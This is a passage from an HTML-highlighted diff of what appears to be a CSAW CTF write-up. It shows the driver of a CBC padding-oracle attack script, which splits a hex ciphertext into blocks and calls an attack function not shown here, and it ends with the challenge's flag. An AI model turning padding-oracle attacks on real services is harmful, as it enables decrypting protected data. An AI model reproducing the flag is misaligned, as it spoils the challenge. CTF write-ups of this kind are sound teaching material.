+<span style="color: #f8f8f2">ct</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;73ac6b9467204843d5d15c02c04b2a7e597b04c20f18d0de78512b8e06c4d684e127099a07cb7cb7b89818711a54e7ebc3d4567df35e5b5438416854f808e6e70bd7bb4a5445fba0497bdd11e7b6df0f466ea52c48bf445858c53120f957b976ec1e1a5e7c1ab6c072df8a0cbe0ba84cbd810e2a2d7ea32c317b58378b0b8bed115f9841491791ad05525e6c054a40d6f8eac2dc855964e56e51490712470ee4e68b842251a896da4f02ecc16b4209e89d90e85d4559b7b5e62f4a1f067318870451a681ca3a3144a3e39627774acc062659903db5cec74962a25eca6538000d1cc02d08c5bb9280d30cea4e586dfd05b69ac852d8d758b26aa00973e13bdc09534f300e507680e568908e9c2a366c9a90b082ea0a15ba6849deb2f27c514b82f0198202de7fa72a03befc1eeb5be6a7a17bd6fa6a97410971496909d09be2f7014f78667b0df5d44bf1b7e9437d013badc8509d62fa5722b1aeeb4c7e68e3ee627b1ef5256baba562e1f90bc627ae62e13f53878d9b7ce2bb5d0ee8de05f494be38647362468d1530d7aee8b1857747aadcfd2e43f67a9489efdd75fe986f9a9c2f686a0af020a59860153b9f646d9699b44ffae0b761d959476e960cb354f0d7264c8da1220c13b9c65cf3a1dfae00844b3db7fc4eee87185ba1e71401598d167a787a54d2d363a04daddcf27225656ef664aabf092feb59c16e39986f31a59d00ff1ae8f92347d2543d2d5b0e8af0e4e0856df775087b02dc37c1b2e15269bdd85446c9e00ff648f7de40673c4c73145537e77e452a33c2a989990473414e6694d7e94279dafefa66848373f5789d00d6260708a64cb63ce4ac2ad7ca3f8d00259fadee461070923c8dc4ceed1a439f70353ba4e8b26ad87551b24474ab34fe4c80d92acea95adb2adac69fd6965a58ed628495978a05805044a5e00831ffc07e480de9d166df626502346a82c714d52c02163512197e9f3d98f734ceee0b1de173d91a53dbce124a3d968a4e9aa1fe23e818989ae5734f1a2a2de387abd4a9a4d13ef4a47bf50725614d2fcefdd9f37e209e04f9736f2d04029eb80e837d0fe590edf2d2d7d404f1f333968e33fb2b4a2241cf5193dc4bbc0aeedc6cb200cc659691d2d2d1a3456fc8b827b245c997e4336e3e1217d15d4f0f6ee4f2c48609d1a3c53dc868e52dd2b8a11c0ac8ffa90226377a7b0aa082200f92c8258427aab57f919153c56c9dfaa479baf8bfcb65ac9e2bce451aefb2b20fef795e556fda77e2664dc36dca010ab1a1f7ee838ca11264bfa1265dd009818cbb985ce7c328cb52659a07ed09fd3244a0f2f46602816ca3db74b4fea74261d04a153c34533fb034bfe4a634fc32087290832c367a2b7943c404d7bdf15b06380c57c1f018221f478b6aefd3e63f381eb84377c141a60df7c3f64a0dec8e87d042dead5b0bdf9e97acb4fac853f1fe3780e2a007426af6e086df225f7028f2ed16cdc6e947eb08073fe1705d92359fa32b6ba17c450d8f50902437d722ef0d596f528413c8572d37f84fd0411217ad18b1e0cb21378d87b94a821bceb41ed344764c5be556a126447942d166f6a2159c8f32784f6de7390679c8c411d12b36414679b2cdb1e9848e530458fd650a27d7fc889614bedac0fc15431dddb5555de445e36153bcb1c404782dc4af105d18d4245b3aadf6ec92dee9a7186ba3857a1716bf14a41b2bc1549d9094f17e9a44767501df1c24812e6fb7c20df48d47ea627cfeac77c8dd5a6994650f8736097b7bf2f44dc403a5fea89e5e28db9eefc176c2cdb80603f00c3f7485465daa137d2b851a14208705b3fd8f8b8a3fa845385e49cdee6e0b3a7b7ad9747307d1f30743b844b313c50496f420efbff99bc00d2e8e8b42436ecbcc95060b4656656ea5566e5451114a6e850102aae33c8b7e7a90b68b9953726bcbfbd8de3ec77e131889b6847d4ed88afc73356ef22c29f1b8abee4b0811e24f4da87a25681ea0b28c74fdf6d2bb2761b2a58a1913de8506d786d66ba5116a5a033118c86aec3b400cdb213ffca2f9c5c1cff1b67d431cff97c28b6f8871a13f170f07dd8215516b2d87eb0394868685f843686995fb06b95d3a108c8d27f1ee1df604f0f747e8fad32ed1ddfb8dea3ebb81e1b32b3d28a907fe516c54084da10f12175c5930a4de473575214691d5ddb65ef41281cbcb46563eba05517045eee6fcb921f38e3523aaaf8fbd9f0918fbff3dc7f97a76968b478598af276bc3c37098484d6c96bebeadcea13bc7d99e2a7c38e39965f75cd7993fec9b3acb212ce8b86e16b74c3e4960c62308df936e9de65fe69f012519d1d2d3cb73c31a01eb8f9ea930e5e51e4d75132140899c0012d4c8a72464422232a9499cd5be1fbf45831adc04dc455a093abdc73fb40295ea175ccf5b80c982d980146d9aa67085f0c7d1f900cb28d2b4b9d053644933c40a06743b4675245f89be885b3baef2e256b240c5520d71f7fa1079fbb9ba6f89cb6b96fcb6e236f79a82089262dbd1f7c426741baee206d99c77a2eb7323fd6a42edae2290258e3c121963864c52f54bf8ffef3d216004d2e430cc0dbbfda5ec3677ce4f344eab00558fc91d9320f1dcf2ea1a40605a49700ed364d1f8992867154a72b6987d09fac38dd140d68a37a0b5a24b2789c73cd9ea8308eb05cebc0e002937ef1c99fbcfba456ab757be0d9bfa155aafc67473b85ff63cafdfa4ec0406be41d8c8fbf8c135bf9ccc388773aa47a1599febb55c0bcd5c00613dc83138e3d79534d714a4ef594d6eec533ee7c50a8e9ec76563230474f7f0da1a9d079c5f242989facaee47b556d0b4766fd581b4167029c2d732c0e189e2a37a00a54e43d850d1ba7f5ea5413bda15338783ca8a8bebe4264cdf3c4a927091a1a24c3278141db7be7f8f96873d63bdf8bf85b189de892ef228d441511eac904cf5dca290fc70d379c768116e221a120fb8e378d8e6f0bb03dd899ba32c815c22d19b2c5e4cd8d367aaefa327aa1608e53007f36911f9f215ab7fd800ba9807de83482f675cc9db7e667b52031adab70fa5dec434006f80987f1acd4b4f2f8745cb3a60a49820b6166d135bbff2c9bf7f7ff695174ced6e9eb561caf047201d71d31307a0815f23f8e27d13e99bc580e1a2470197acda11459de2ded7bde440ddee63761e168f5d3b4577bc765dcb568d1fbb237dc583817cfcf08eca76228928c15bcae6d5c4a542aaa1f14413849f199bffeab8d7271fbac7e7586aaff05f91b082f8f27069c71406a9ef81f98ba41d1fc10737a11491657df0b92e4e2fe7b83f601cb216de21cb266849e79208bcb1c0b43777b9859114b8d1b582dcc26b74566a32a44b8c44461023719f59a75f071d9e33&quot;</span>
+<span style="color: #f8f8f2">ctDecoded</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytes</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">fromhex(ct)</span>
+
+<span style="color: #f8f8f2">BLOCKSIZE</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">16</span>
+
+<span style="color: #f8f8f2">blocks</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>
+<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">range(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,len(ctDecoded),BLOCKSIZE):</span>
+	<span style="color: #f8f8f2">blocks</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(ctDecoded[i:i</span><span style="color: #f92672">+</span><span style="color: #f8f8f2">BLOCKSIZE])</span>
+
+<span style="color: #f8f8f2">plaintext</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">cbcPaddingOracleAttack(blocks)</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;Found plaintext:&quot;</span><span style="color: #f8f8f2">,plaintext)</span>
+</pre></div>
+<p></p>
+
+<!-- HTML generated using hilite.me --><div style="background: #272822; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #f8f8f2">flag:</span><span style="color: #e6db74">&quot;csawctf{I_L0ST_TR4CK_0N_WH3R3_I_W4S_G01NG_W1TH_TH15}&quot;</span>
+</pre></div>
+
